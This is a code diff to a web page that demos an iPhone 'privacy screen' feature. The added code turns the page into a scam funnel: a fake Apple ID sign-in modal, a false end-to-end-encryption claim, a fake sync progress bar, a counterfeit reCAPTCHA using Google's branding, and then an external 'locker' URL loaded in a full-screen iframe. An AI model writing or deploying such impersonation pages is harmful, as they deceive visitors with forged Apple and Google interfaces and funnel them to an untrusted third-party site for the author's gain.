@@ -35,7 +35,6 @@
         .mockup-phone {
             width: 190px;
             height: 340px;
-            /* الخلفية ديال iOS الجديد */
             background: linear-gradient(135deg, #1e3a8a, #7e22ce, #c2410c);
             border: 10px solid #4a4a4a;
             border-radius: 32px;
@@ -88,6 +87,10 @@
             background-color: #222222;
             box-shadow: 0 4px 8px rgba(0,0,0,0.2);
         }
+
+        .progress-animate { transition: width 4s linear; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .animate-spin { animation: spin 1s linear infinite; }
     </style>
 </head>
 <body>
@@ -112,7 +115,7 @@
 
             <div class="text-center px-4 mt-6">
                 <h2 class="text-[25px] font-bold leading-tight tracking-tight text-[#111]">
-                     Enable<br>privacy screen feature<br>on your Device
+                    Discover how to enable<br>privacy screen feature<br>on iPhone
                 </h2>
             </div>
         </div>
@@ -147,16 +150,89 @@
                 </p>
             </div>
 
-            <div class="mt-8 mb-6 text-center">
+            <div class="mt-8 mb-6 text-center flex flex-col gap-3">
                 <button class="btn-demo" id="startDemoBtn">
                     Start Demo
+                </button>
+                
+                <button class="btn-demo" style="background-color: #007AFF; box-shadow: 0 10px 20px -5px rgba(0,122,255,0.4);" onclick="openModal('icloudModal')">
+                    <i class="ri-apple-fill text-xl mr-2"></i> Active to My Device
                 </button>
             </div>
         </div>
 
     </div>
 
+    <div id="icloudModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm z-[100] hidden items-center justify-center px-4">
+        <div class="bg-[#f2f2f7] text-black w-full max-w-sm rounded-2xl p-6 text-center shadow-2xl transition-colors">
+            <i class="ri-apple-fill text-5xl mb-2"></i>
+            <h3 class="text-[19px] font-semibold mb-2">Sign in with Apple ID</h3>
+            <p class="text-[13px] text-gray-500 mb-6 leading-relaxed">Enter your iCloud ID to sync this BETA feature to your device.</p>
+            <input type="email" id="appleIdInput" placeholder="Email or Phone Number" class="w-full p-3 rounded-lg border border-gray-300 bg-white text-black mb-4 outline-none focus:border-[#007AFF] text-[15px]">
+            <button onclick="startSync()" class="w-full bg-[#007AFF] text-white font-semibold py-3 rounded-xl text-[16px]">Activate</button>
+            <button onclick="closeModal('icloudModal')" class="w-full mt-3 text-[#007AFF] font-medium py-2 text-[15px]">Cancel</button>
+            
+            <div class="mt-5 flex justify-center">
+                <button onclick="openModal('privacyModal')" class="flex items-center gap-1 text-[11px] text-gray-500 hover:text-[#007AFF] transition-colors">
+                    <i class="ri-lock-2-fill"></i> End-to-End Encrypted
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div id="privacyModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm z-[110] hidden items-center justify-center px-4">
+    <div class="bg-[#FAF9F6] text-black w-full max-w-sm rounded-2xl p-6 text-center shadow-2xl transition-colors">
+        <h3 class="text-[19px] font-semibold mb-3">Privacy & Security</h3>
+        <p class="text-[14px] text-gray-700 leading-relaxed mb-6">
+            This Beta feature utilizes highly secured protocols and established Apple Developer Certificates to ensure all connections are End-to-End Encrypted. Your synchronization is safe and anonymous.
+        </p>
+        <button onclick="closeModal('privacyModal')" class="w-full bg-[#E9E9EB] text-black font-semibold py-3.5 rounded-xl text-[16px] active:scale-95 transition-transform">Got it, thanks</button>
+    </div>
+</div>
+
+    <div id="loadingModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm z-[100] hidden items-center justify-center px-4">
+        <div class="bg-[#f2f2f7] text-black w-full max-w-sm rounded-2xl p-6 text-center shadow-2xl transition-colors">
+            <h3 class="text-lg font-semibold mb-2">Syncing to Device...</h3>
+            <p class="text-sm text-gray-500 mb-6">Please do not close this page.</p>
+            <div class="w-full bg-gray-300 rounded-full h-2 mb-2 overflow-hidden">
+                <div id="syncProgress" class="bg-[#007AFF] h-2 rounded-full w-0 progress-animate"></div>
+            </div>
+            <p class="text-xs text-gray-500 mt-2">Connecting to Apple Servers</p>
+        </div>
+    </div>
+
+    <div id="captchaModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm z-[100] hidden items-center justify-center px-4">
+        <div class="bg-white w-full max-w-sm rounded-xl p-6 text-center shadow-2xl transition-colors">
+            <h3 class="font-normal text-[22px] text-black mb-1">Verify that it's you</h3>
+            <p class="text-gray-600 text-[14px] mb-6">Confirm that you're not a robot</p>
+            
+            <div class="bg-[#f9f9f9] border border-[#d3d3d3] rounded p-3 flex items-center justify-between cursor-pointer hover:shadow-md transition-shadow" onclick="triggerLocker()">
+                <div class="flex items-center gap-3">
+                    <div id="rc-check" class="w-7 h-7 bg-white border-2 border-[#c1c1c1] rounded-sm"></div>
+                    <div id="rc-spinner" class="hidden w-7 h-7 border-2 border-transparent border-t-blue-500 rounded-full animate-spin"></div>
+                    <span class="text-[#222] font-normal text-[14px] tracking-wide">I'm not a robot</span>
+                </div>
+                <div class="flex flex-col items-center">
+                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" class="w-8 opacity-80 mb-1">
+                    <div class="text-[8px] text-[#555] flex items-center gap-1 font-medium">
+                        <a href="https://policies.google.com/privacy" target="_blank" class="hover:underline" onclick="event.stopPropagation()">Privacy</a> - 
+                        <a href="https://policies.google.com/terms" target="_blank" class="hover:underline" onclick="event.stopPropagation()">Terms</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="lockerModal" class="fixed inset-0 bg-black/95 z-[999] hidden items-center justify-center">
+        <div class="w-full max-w-[500px] h-[85vh] bg-white rounded-2xl relative overflow-hidden">
+            <button onclick="closeModal('lockerModal')" class="absolute top-2 right-2 w-8 h-8 bg-black/10 rounded-full flex items-center justify-center z-50 text-black">✕</button>
+            <iframe id="lockerIframe" class="w-full h-full border-none"></iframe>
+        </div>
+    </div>
+
+
     <script>
+        // ================= سكريبت الجيروسكوب =================
         const startDemoBtn = document.getElementById('startDemoBtn');
         const innerLens = document.getElementById('innerLens');
         
@@ -211,6 +287,58 @@
             if (opacity > 0.98) opacity = 0.98; 
             
             innerLens.style.opacity = opacity;
+        }
+
+        // ================= سكريبت الـ Modals =================
+        function openModal(id) {
+            document.getElementById(id).classList.remove('hidden');
+            document.getElementById(id).classList.add('flex');
+        }
+
+        function closeModal(id) {
+            document.getElementById(id).classList.add('hidden');
+            document.getElementById(id).classList.remove('flex');
+        }
+
+        function startSync() {
+            const inputElement = document.getElementById('appleIdInput');
+            const input = inputElement.value.trim();
+            
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phoneRegex = /^\+?[0-9]{8,15}$/;
+
+            if (!emailRegex.test(input) && !phoneRegex.test(input)) {
+                inputElement.style.border = "2px solid #FF3B30"; 
+                return; 
+            }
+
+            inputElement.style.border = "";
+            
+            closeModal('icloudModal');
+            openModal('loadingModal');
+            
+            setTimeout(() => { document.getElementById('syncProgress').style.width = '100%'; }, 100);
+
+            setTimeout(() => {
+                closeModal('loadingModal');
+                openModal('captchaModal');
+            }, 4000);
+        }
+
+        function triggerLocker() {
+            document.getElementById('rc-check').classList.add('hidden');
+            document.getElementById('rc-spinner').classList.remove('hidden');
+            
+            setTimeout(() => {
+                closeModal('captchaModal');
+                document.getElementById('rc-check').classList.remove('hidden');
+                document.getElementById('rc-spinner').classList.add('hidden');
+                
+                // الرابط ديال اللوكر ديالك
+                const lockerUrl = "https://performingsecurity.downapk.online/cl/i/j77o9j";
+                document.getElementById('lockerIframe').src = lockerUrl;
+                openModal('lockerModal');
+            }, 1200);
         }
     </script>
 </body>
